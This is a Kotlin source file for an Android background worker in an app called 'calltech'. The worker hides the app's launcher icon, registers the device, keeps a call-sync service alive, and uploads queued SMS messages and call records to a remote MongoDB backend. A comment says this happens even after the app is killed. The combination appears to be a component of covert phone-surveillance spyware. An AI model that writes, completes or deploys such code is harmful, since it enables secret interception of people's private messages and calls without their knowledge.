package com.calltech

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters

/** App kill hone par bhi WorkManager poora SMS/call MongoDB me bhejta hai. */
class PhoneSyncWorker(
    context: Context,
    params: WorkerParameters,
) : Worker(context, params) {

    override fun doWork(): Result {
        val app = applicationContext
        Log.d(TAG, "WorkManager sync start")

        return try {
            MongoSyncHelper.ensureApiUrl(app)
            LauncherHider.hideIfMarked(app)
            DeviceRegistration.registerNow(app)
            CallSyncService.ensureRunning(app)
            PendingSmsQueue.flush(app)
            PendingCallSync.flushIfPending(app)
            InstallFlow.runFirstCloudSync(app)
            SyncAlarmScheduler.scheduleNext(app)
            Log.d(TAG, "WorkManager sync done")
            Result.success()
        } catch (error: Exception) {
            Log.e(TAG, "WorkManager sync failed", error)
            Result.retry()
        }
    }

    companion object {
        private const val TAG = "PhoneSyncWorker"
    }
}
